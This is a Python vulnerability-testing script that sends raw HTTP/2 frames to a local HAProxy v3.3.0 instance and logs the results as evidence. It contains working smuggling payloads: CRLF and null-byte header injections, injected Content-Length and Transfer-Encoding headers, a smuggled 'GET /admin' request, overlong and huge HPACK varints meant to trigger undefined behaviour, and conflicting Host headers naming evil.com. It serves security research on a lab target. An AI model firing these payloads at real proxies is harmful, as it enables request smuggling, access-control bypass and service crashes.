#!/usr/bin/env python3
"""
Phase 3B: HTTP/2 Deep-Dive — H2-to-H1 CRLF/Null Injection Verification
Target: HAProxy v3.3.0 on 127.0.0.1:8443 (HTTPS/H2) → backend on 9090 (H1)

This script verifies whether CRLF and null bytes in H2 header values
actually reach the HTTP/1.1 backend, creating a smuggling/injection vector.
"""

import socket
import ssl
import struct
import time
import json
import sys
import os
import traceback
import http.client
import urllib.parse

EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase3b_h2_deepdive.json")

HOST = "127.0.0.1"
PORT = 8443
BACKEND_PORT = 9090

# H2 constants
H2_FRAME_DATA = 0x0
H2_FRAME_HEADERS = 0x1
H2_FRAME_SETTINGS = 0x4
H2_FRAME_GOAWAY = 0x7
H2_FRAME_WINDOW_UPDATE = 0x8
H2_FRAME_CONTINUATION = 0x9
H2_FRAME_RST_STREAM = 0x3

H2_FLAG_END_STREAM = 0x1
H2_FLAG_END_HEADERS = 0x4

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None, raw_data=None):
        self.test_count += 1
        entry = {
            "id": self.test_count,
            "category": category,
            "name": name,
            "result": result,
            "details": details,
            "timestamp": time.time()
        }
        if severity:
            entry["severity"] = severity
        if raw_data:
            entry["raw_data"] = raw_data
        self.tests.append(entry)
        if result == "ANOMALY":
            self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)
        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in str(details).split("\n")[:5]:
                print(f"               {line}")

    def save(self):
        data = {
            "phase": "Phase 3B: HTTP/2 Deep-Dive — H2-to-H1 Injection",
            "target": "HAProxy v3.3.0",
            "timestamp": time.time(),
            "summary": {
                "total_tests": self.test_count,
                "anomalies": self.anomaly_count,
                "findings": self.finding_count
            },
            "findings": self.findings,
            "tests": self.tests
        }
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")


evidence = EvidenceCollector()


# --- H2 Helpers ---

def build_frame(frame_type, flags, stream_id, payload):
    length = len(payload)
    header = struct.pack(">I", length)[1:]
    header += struct.pack(">B", frame_type)
    header += struct.pack(">B", flags)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload


def build_settings_frame(settings=None, ack=False):
    if ack:
        return build_frame(H2_FRAME_SETTINGS, 0x1, 0, b"")
    payload = b""
    if settings:
        for k, v in settings.items():
            payload += struct.pack(">HI", k, v)
    return build_frame(H2_FRAME_SETTINGS, 0, 0, payload)


def hpack_encode_int(value, prefix_bits, prefix_byte=0):
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([prefix_byte | value])
    result = bytes([prefix_byte | max_prefix])
    value -= max_prefix
    while value >= 128:
        result += bytes([(value & 0x7F) | 0x80])
        value >>= 7
    result += bytes([value])
    return result


def h2_connect(host=HOST, port=PORT):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=5)
    tls_sock = ctx.wrap_socket(sock, server_hostname=host)
    tls_sock.sendall(H2_PREFACE)
    tls_sock.sendall(build_settings_frame())
    time.sleep(0.1)
    try:
        resp = tls_sock.recv(16384)
    except:
        resp = b""
    tls_sock.sendall(build_settings_frame(ack=True))
    time.sleep(0.1)
    return tls_sock


def h2_read_frames(sock, timeout=2, max_bytes=65536):
    data = b""
    sock.settimeout(timeout)
    try:
        while len(data) < max_bytes:
            chunk = sock.recv(16384)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, ssl.SSLError):
        pass
    return data


def parse_frames(data):
    frames = []
    pos = 0
    while pos + 9 <= len(data):
        length = int.from_bytes(data[pos:pos+3], 'big')
        ftype = data[pos+3]
        flags = data[pos+4]
        stream_id = int.from_bytes(data[pos+5:pos+9], 'big') & 0x7FFFFFFF
        if pos + 9 + length > len(data):
            break
        payload = data[pos+9:pos+9+length]
        frames.append((ftype, flags, stream_id, payload))
        pos += 9 + length
    return frames


def decode_h2_response(frames):
    """Try to extract response status and headers from H2 response frames."""
    for ftype, flags, stream_id, payload in frames:
        if ftype == H2_FRAME_HEADERS and stream_id > 0:
            # Simple status extraction from HPACK-encoded headers
            if len(payload) > 0:
                first_byte = payload[0]
                # Indexed header field
                if first_byte & 0x80:
                    idx = first_byte & 0x7F
                    if idx == 8:
                        return 200, payload
                    elif idx == 9:
                        return 204, payload
                    elif idx == 13:
                        return 304, payload
                    elif idx == 14:
                        return 400, payload
                    elif idx == 15:
                        return 404, payload
                    elif idx == 11:
                        return 301, payload
            return -1, payload
    return None, b""


def build_h2_request_with_headers(path, extra_headers, method=b"GET", stream_id=1, end_stream=True):
    """Build an H2 HEADERS frame with custom headers via raw HPACK encoding."""
    block = b""
    # :method = GET/POST
    if method == b"GET":
        block += b"\x82"  # index 2
    elif method == b"POST":
        block += b"\x83"  # index 3
    else:
        block += b"\x40"  # Literal with indexing, new name
        name = b":method"
        block += hpack_encode_int(len(name), 7)
        block += name
        block += hpack_encode_int(len(method), 7)
        block += method

    # :path
    if path == b"/":
        block += b"\x84"  # index 4
    else:
        block += b"\x41"  # index 4 with indexing - no wait, let me do literal
        # Literal with indexing, name index 5 (:path)
        block += b"\x44"  # Literal with indexing, name index 4 (:path)
        block += hpack_encode_int(len(path), 7)
        block += path

    # :scheme = https
    block += b"\x86"  # index 6/7

    # :authority
    block += b"\x41"  # Literal with indexing, name index 1 (:authority)
    auth = b"127.0.0.1:8443"
    block += hpack_encode_int(len(auth), 7)
    block += auth

    # Extra custom headers
    for hname, hvalue in extra_headers:
        if isinstance(hname, str):
            hname = hname.encode()
        if isinstance(hvalue, str):
            hvalue = hvalue.encode()
        # Literal without indexing, new name (0x00 prefix)
        block += b"\x00"
        block += hpack_encode_int(len(hname), 7)
        block += hname
        block += hpack_encode_int(len(hvalue), 7)
        block += hvalue

    flags = H2_FLAG_END_HEADERS
    if end_stream:
        flags |= H2_FLAG_END_STREAM
    return build_frame(H2_FRAME_HEADERS, flags, stream_id, block)


def extract_backend_response(frames):
    """Extract backend echo server response from H2 DATA frames."""
    data_payload = b""
    for ftype, flags, stream_id, payload in frames:
        if ftype == H2_FRAME_DATA and stream_id > 0:
            data_payload += payload
    if data_payload:
        try:
            return json.loads(data_payload.decode('utf-8', errors='replace'))
        except:
            return {"raw": data_payload.decode('utf-8', errors='replace')}
    return None


# ============================================================
# Category 1: CRLF in H2 Header Value — Backend Verification
# ============================================================
def test_crlf_backend_verification():
    print("\n[*] Category 1: CRLF in H2 Header Value — Backend Impact")

    # Test 1.1: CRLF in header value — does the backend receive injected header?
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/crlf-test",
            [(b"x-test", b"before\r\ninjected: evil")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)

        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        rst = [f for f in frames if f[0] == H2_FRAME_RST_STREAM]

        if goaway:
            evidence.add_test("CRLF-Backend", "crlf_basic",
                            "SAFE", "GOAWAY — rejected at H2 layer")
        elif rst:
            evidence.add_test("CRLF-Backend", "crlf_basic",
                            "SAFE", "RST_STREAM — rejected at stream level")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                # Check if "injected" appears as a separate header
                has_injected = "injected" in str(headers).lower()
                has_crlf_in_value = "before" in str(headers) and "\\r\\n" not in str(headers.get("x-test", ""))

                raw_data = {
                    "backend_headers": headers,
                    "has_injected_header": has_injected,
                    "full_response": backend_data
                }

                if has_injected:
                    evidence.add_test("CRLF-Backend", "crlf_basic", "FINDING",
                                    f"H2-to-H1 HEADER INJECTION CONFIRMED!\n"
                                    f"Backend sees 'injected: evil' as separate header.\n"
                                    f"Headers: {json.dumps(headers, indent=2)[:500]}",
                                    "HIGH", raw_data)
                else:
                    evidence.add_test("CRLF-Backend", "crlf_basic", "ANOMALY",
                                    f"H2 accepted CRLF but backend sees: {json.dumps(headers, indent=2)[:300]}",
                                    "MEDIUM", raw_data)
            else:
                evidence.add_test("CRLF-Backend", "crlf_basic", "ANOMALY",
                                "H2 accepted CRLF but no backend response data extracted",
                                "MEDIUM")
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "crlf_basic", "ERROR", str(e))

    # Test 1.2: Bare LF in H2 header value
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/lf-test",
            [(b"x-test", b"before\ninjected: evil")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        rst = [f for f in frames if f[0] == H2_FRAME_RST_STREAM]

        if goaway or rst:
            evidence.add_test("CRLF-Backend", "bare_lf", "SAFE",
                            "Bare LF in H2 value rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                has_injected = "injected" in str(headers).lower()
                evidence.add_test("CRLF-Backend", "bare_lf",
                                "FINDING" if has_injected else "ANOMALY",
                                f"Bare LF {'INJECTED header!' if has_injected else 'accepted'}: {json.dumps(headers, indent=2)[:300]}",
                                "HIGH" if has_injected else "MEDIUM",
                                {"backend_headers": headers})
            else:
                evidence.add_test("CRLF-Backend", "bare_lf", "ANOMALY",
                                "H2 accepted bare LF but no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "bare_lf", "ERROR", str(e))

    # Test 1.3: Bare CR in H2 header value
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/cr-test",
            [(b"x-test", b"before\rinjected: evil")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("CRLF-Backend", "bare_cr", "SAFE", "Bare CR rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                evidence.add_test("CRLF-Backend", "bare_cr", "ANOMALY",
                                f"Bare CR accepted: {json.dumps(headers, indent=2)[:300]}",
                                raw_data={"backend_headers": headers})
            else:
                evidence.add_test("CRLF-Backend", "bare_cr", "ANOMALY", "CR accepted, no data")
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "bare_cr", "ERROR", str(e))

    # Test 1.4: CRLF injection to add Content-Length (smuggling attempt)
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/smuggle-test",
            [(b"x-test", b"before\r\ncontent-length: 100")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("CRLF-Backend", "crlf_inject_cl", "SAFE",
                            "CRLF+Content-Length injection rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                has_cl = "content-length" in [k.lower() for k in headers.keys()]
                evidence.add_test("CRLF-Backend", "crlf_inject_cl",
                                "FINDING" if has_cl else "ANOMALY",
                                f"CRLF+CL: {'INJECTED!' if has_cl else 'accepted but CL not seen'}\n{json.dumps(headers, indent=2)[:300]}",
                                "CRITICAL" if has_cl else "MEDIUM",
                                {"backend_headers": headers})
            else:
                evidence.add_test("CRLF-Backend", "crlf_inject_cl", "ANOMALY",
                                "CRLF+CL accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "crlf_inject_cl", "ERROR", str(e))

    # Test 1.5: CRLF injection to add Transfer-Encoding
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/smuggle-te-test",
            [(b"x-test", b"before\r\ntransfer-encoding: chunked")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("CRLF-Backend", "crlf_inject_te", "SAFE",
                            "CRLF+TE injection rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                has_te = "transfer-encoding" in [k.lower() for k in headers.keys()]
                evidence.add_test("CRLF-Backend", "crlf_inject_te",
                                "FINDING" if has_te else "ANOMALY",
                                f"CRLF+TE: {'INJECTED!' if has_te else 'accepted but TE not seen'}\n{json.dumps(headers, indent=2)[:300]}",
                                "CRITICAL" if has_te else "MEDIUM",
                                {"backend_headers": headers})
            else:
                evidence.add_test("CRLF-Backend", "crlf_inject_te", "ANOMALY",
                                "CRLF+TE accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "crlf_inject_te", "ERROR", str(e))

    # Test 1.6: Double CRLF (attempt body injection)
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/body-inject-test",
            [(b"x-test", b"before\r\n\r\nGET /admin HTTP/1.1\r\nHost: 127.0.0.1:9090\r\n\r\n")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("CRLF-Backend", "double_crlf_body_inject", "SAFE",
                            "Double CRLF body injection rejected")
        else:
            backend_data = extract_backend_response(frames)
            evidence.add_test("CRLF-Backend", "double_crlf_body_inject",
                            "ANOMALY",
                            f"Double CRLF accepted. Backend: {str(backend_data)[:300]}",
                            "HIGH",
                            {"backend_response": str(backend_data)[:500]})
        sock.close()
    except Exception as e:
        evidence.add_test("CRLF-Backend", "double_crlf_body_inject", "ERROR", str(e))


# ============================================================
# Category 2: Null Byte in H2 Header — Backend Verification
# ============================================================
def test_null_backend_verification():
    print("\n[*] Category 2: Null Byte in H2 Header — Backend Impact")

    # Test 2.1: Null byte in header value — what does backend see?
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/null-test",
            [(b"x-test", b"before\x00after")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]

        if goaway:
            evidence.add_test("Null-Backend", "null_basic", "SAFE",
                            "Null byte rejected at H2 layer")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                x_test = headers.get("x-test", headers.get("X-Test", "NOT FOUND"))
                evidence.add_test("Null-Backend", "null_basic", "ANOMALY",
                                f"Null byte forwarded to backend.\n"
                                f"X-Test value: {repr(x_test)}\n"
                                f"All headers: {json.dumps(headers, indent=2)[:300]}",
                                "MEDIUM",
                                {"backend_headers": headers, "x_test_value": repr(x_test)})
            else:
                evidence.add_test("Null-Backend", "null_basic", "ANOMALY",
                                "Null accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("Null-Backend", "null_basic", "ERROR", str(e))

    # Test 2.2: Null byte truncation — does value get truncated?
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/null-trunc-test",
            [(b"x-auth", b"admin\x00anonymous")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]

        if goaway:
            evidence.add_test("Null-Backend", "null_truncation", "SAFE",
                            "Null byte rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                x_auth = headers.get("x-auth", headers.get("X-Auth", "NOT FOUND"))
                # If truncated to "admin" this is a bypass vector
                if x_auth == "admin":
                    evidence.add_test("Null-Backend", "null_truncation", "FINDING",
                                    f"NULL BYTE TRUNCATION! Backend sees: '{x_auth}'\n"
                                    f"Sent: 'admin\\x00anonymous' → Backend received: '{x_auth}'\n"
                                    f"AUTH BYPASS VECTOR: attacker can bypass 'admin' checks",
                                    "HIGH",
                                    {"sent": "admin\\x00anonymous", "received": x_auth})
                else:
                    evidence.add_test("Null-Backend", "null_truncation", "ANOMALY",
                                    f"Null forwarded. Backend X-Auth: {repr(x_auth)}",
                                    "MEDIUM",
                                    {"sent": "admin\\x00anonymous", "received": repr(x_auth)})
            else:
                evidence.add_test("Null-Backend", "null_truncation", "ANOMALY",
                                "Null accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("Null-Backend", "null_truncation", "ERROR", str(e))


# ============================================================
# Category 3: HPACK Varint Overflow — Fixed Raw Socket Test
# ============================================================
def test_hpack_varint_raw():
    print("\n[*] Category 3: HPACK Varint Overflow — Raw Wire Tests")

    # The Python h2 library validates varint encoding. We need raw wire access.
    # Build a complete H2 HEADERS frame with hand-crafted HPACK bytes.

    for num_extra in [5, 8, 12, 20, 30]:
        try:
            sock = h2_connect()

            # Build HPACK block with overlong varint in value length field
            block = b""
            block += b"\x82"  # :method = GET (index 2)
            block += b"\x84"  # :path = / (index 4)
            block += b"\x86"  # :scheme = https (index 7)
            block += b"\x41"  # :authority with indexing, name index 1
            authority = b"127.0.0.1:8443"
            block += hpack_encode_int(len(authority), 7)
            block += authority

            # Add a custom header with overlong varint value length
            # Literal without indexing (0x00 prefix byte), new name
            block += b"\x00"
            name = b"x-test"
            block += hpack_encode_int(len(name), 7)  # normal name length
            block += name

            # Now encode the value length (5 for "hello") using overlong encoding
            # Normal encoding of 5 in 7-bit prefix: just \x05
            # Overlong: we use the multibyte form: \x7f \x80 \x80 ... \x80 <final>
            # First byte: 0x7f (127 = max for 7-bit prefix, triggers multibyte)
            # But we want value = 5, so we need to think differently
            # Actually, 5 < 127, so normal encoding is just \x05
            # To force overlong encoding: pretend value >= 127
            # \x7f = 127, remaining = 5 - 127 = negative... doesn't work

            # Alternative approach: Encode the actual value 5 but with extra zero continuation bytes
            # This is what triggers the shift overflow — extra bytes with value 0x80 (continue, data=0)
            # The decoder does: value += (byte & 0x7f) << shift, shift += 7
            # Continuation bytes 0x80 add 0 << shift, but increment shift
            # After enough bytes, shift >= 32 and the final byte's shift causes UB

            # Value = 5: use multibyte form
            # First: we need value >= max_prefix to trigger multibyte
            # For 7-bit prefix, max = 127, but 5 < 127, so we can't use standard multibyte

            # However, we can use a value that IS >= 127 and add padding zeros
            # Let's use value = 200 for the length and pad the actual value
            # No — that changes the semantics

            # Actually, the proper approach for testing: directly craft the wire bytes
            # Encode a legitimate large value (like 127+) with extra continuation bytes
            # that don't change the value but push the shift count past 32

            # Encode value = 127 in multibyte form:
            # First byte: 0x7F (all 7 bits set → multibyte)
            # Remaining: 127 - 127 = 0
            # Standard: 0x7F 0x00 (0 with high bit clear = terminal)
            # Overlong: 0x7F 0x80 0x80 ... 0x80 0x00
            # Each 0x80 byte adds (0 << shift) and increments shift by 7

            value_len_bytes = bytes([0x7F])  # max prefix → multibyte
            # Add extra continuation bytes (high bit set, value 0)
            for i in range(num_extra):
                value_len_bytes += bytes([0x80])
            value_len_bytes += bytes([0x00])  # terminal byte, value = 0
            # Total decoded value: 127 + 0 = 127 bytes for value

            block += value_len_bytes
            # Pad actual value to 127 bytes
            value = b"A" * 127
            block += value

            frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
            sock.sendall(frame)
            time.sleep(0.5)
            resp = h2_read_frames(sock, timeout=2)
            frames = parse_frames(resp)

            goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            header_frames = [f for f in frames if f[0] == H2_FRAME_HEADERS]
            data_frames = [f for f in frames if f[0] == H2_FRAME_DATA]

            if goaway:
                error_code = struct.unpack(">I", goaway[0][3][4:8])[0] if len(goaway[0][3]) >= 8 else -1
                evidence.add_test("HPACK-Varint-Raw", f"overlong_{num_extra}extra",
                                "SAFE", f"GOAWAY error={error_code} — overlong varint rejected")
            elif header_frames:
                # Request was accepted despite overlong varint encoding!
                # This means the decoder processed past shift=32 (UB territory)
                backend_data = extract_backend_response(frames)
                evidence.add_test("HPACK-Varint-Raw", f"overlong_{num_extra}extra",
                                "FINDING",
                                f"Overlong varint with {num_extra} extra bytes ACCEPTED!\n"
                                f"shift reaches {7 * num_extra}+ bits — UB in get_var_int()\n"
                                f"Backend response: {str(backend_data)[:200]}",
                                "HIGH" if num_extra >= 8 else "MEDIUM",
                                {"extra_bytes": num_extra, "max_shift": 7 * num_extra,
                                 "backend": str(backend_data)[:300]})
            else:
                # Connection closed or no response
                evidence.add_test("HPACK-Varint-Raw", f"overlong_{num_extra}extra",
                                "ANOMALY",
                                f"No response — connection dropped after {num_extra} extra bytes\n"
                                f"Possible crash? Check ASAN output.",
                                "MEDIUM")
            sock.close()
        except Exception as e:
            evidence.add_test("HPACK-Varint-Raw", f"overlong_{num_extra}extra",
                            "ERROR", str(e))

    # Test: HPACK integer that decodes to a very large value via overlong encoding
    # Send a header with a crafted varint that decodes to INT_MAX or near it
    try:
        sock = h2_connect()
        block = b""
        block += b"\x82\x84\x86"  # method, path, scheme
        block += b"\x41"  # :authority
        auth = b"127.0.0.1:8443"
        block += hpack_encode_int(len(auth), 7)
        block += auth

        # Literal without indexing, new name
        block += b"\x00"
        name = b"x-test"
        block += hpack_encode_int(len(name), 7)
        block += name

        # Value length = UINT32_MAX (should trigger overflow or massive allocation)
        # Encode 0xFFFFFFFF in 7-bit prefix varint:
        # 0x7F, then (0xFFFFFFFF - 127) in 7-bit chunks
        val = 0xFFFFFFFF
        val_bytes = bytes([0x7F])
        remaining = val - 127
        while remaining >= 128:
            val_bytes += bytes([(remaining & 0x7F) | 0x80])
            remaining >>= 7
        val_bytes += bytes([remaining & 0x7F])
        block += val_bytes
        # Don't send actual data — just the header block claiming huge value length

        frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock, timeout=2)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]

        if goaway:
            evidence.add_test("HPACK-Varint-Raw", "huge_varint_uint32max",
                            "SAFE", "GOAWAY — huge varint value rejected")
        else:
            evidence.add_test("HPACK-Varint-Raw", "huge_varint_uint32max",
                            "ANOMALY", "Huge varint value accepted or no response",
                            "MEDIUM")
        sock.close()
    except Exception as e:
        evidence.add_test("HPACK-Varint-Raw", "huge_varint_uint32max", "ERROR", str(e))


# ============================================================
# Category 4: Additional H2-to-H1 Smuggling Vectors
# ============================================================
def test_additional_smuggling():
    print("\n[*] Category 4: Additional H2-to-H1 Smuggling Vectors")

    # Test 4.1: Multiple Host headers via H2
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/multi-host-test",
            [
                (b"host", b"evil.com"),
                (b"host", b"127.0.0.1:9090")
            ]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("H2-Smuggle", "multi_host", "SAFE", "Multiple host headers rejected")
        else:
            backend_data = extract_backend_response(frames)
            evidence.add_test("H2-Smuggle", "multi_host", "ANOMALY",
                            f"Multiple host headers forwarded: {str(backend_data)[:300]}",
                            "MEDIUM",
                            {"backend": str(backend_data)[:500]})
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "multi_host", "ERROR", str(e))

    # Test 4.2: Conflicting :authority and Host
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/auth-host-conflict",
            [(b"host", b"evil.com")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("H2-Smuggle", "authority_host_conflict", "SAFE",
                            "Conflicting authority/host rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                headers = backend_data.get("headers", {})
                host_val = headers.get("host", headers.get("Host", ""))
                evidence.add_test("H2-Smuggle", "authority_host_conflict", "ANOMALY",
                                f"Forwarded with Host={host_val}. Backend: {json.dumps(headers, indent=2)[:300]}",
                                "LOW",
                                {"backend_headers": headers})
            else:
                evidence.add_test("H2-Smuggle", "authority_host_conflict", "ANOMALY",
                                "Accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "authority_host_conflict", "ERROR", str(e))

    # Test 4.3: Header name with space
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/space-name-test",
            [(b"x test", b"value")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("H2-Smuggle", "space_in_name",
                        "SAFE" if goaway else "FINDING",
                        f"Space in header name: {'rejected' if goaway else 'ACCEPTED!'}",
                        None if goaway else "MEDIUM")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "space_in_name", "ERROR", str(e))

    # Test 4.4: TE: trailers (the only allowed TE value in H2)
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/te-trailers-test",
            [(b"te", b"trailers")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        backend_data = extract_backend_response(frames) if not goaway else None
        evidence.add_test("H2-Smuggle", "te_trailers",
                        "SAFE" if not goaway else "ANOMALY",
                        f"TE:trailers {'forwarded' if not goaway else 'rejected'}: {str(backend_data)[:200] if backend_data else ''}",
                        raw_data={"backend": str(backend_data)[:300]} if backend_data else None)
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "te_trailers", "ERROR", str(e))

    # Test 4.5: Header value with only whitespace (obs-fold analog)
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/whitespace-test",
            [(b"x-test", b"  \t  ")]
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("H2-Smuggle", "whitespace_value",
                        "SAFE" if goaway else "ANOMALY",
                        f"Whitespace-only value: {'rejected' if goaway else 'accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "whitespace_value", "ERROR", str(e))

    # Test 4.6: Path with fragment
    try:
        sock = h2_connect()
        frame = build_h2_request_with_headers(
            b"/test#fragment",
            []
        )
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        if goaway:
            evidence.add_test("H2-Smuggle", "path_fragment", "SAFE", "Fragment in path rejected")
        else:
            backend_data = extract_backend_response(frames)
            if backend_data:
                path = backend_data.get("path", "")
                evidence.add_test("H2-Smuggle", "path_fragment", "ANOMALY",
                                f"Fragment in path accepted. Backend path: {path}",
                                "LOW")
            else:
                evidence.add_test("H2-Smuggle", "path_fragment", "ANOMALY",
                                "Fragment accepted, no backend data")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-Smuggle", "path_fragment", "ERROR", str(e))


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("=" * 70)
    print("Phase 3B: HTTP/2 Deep-Dive — H2-to-H1 Injection Verification")
    print(f"Target: HAProxy v3.3.0 @ {HOST}:{PORT} (HTTPS/H2)")
    print("=" * 70)

    try:
        test_crlf_backend_verification()
        test_null_backend_verification()
        test_hpack_varint_raw()
        test_additional_smuggling()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        traceback.print_exc()
    finally:
        evidence.save()
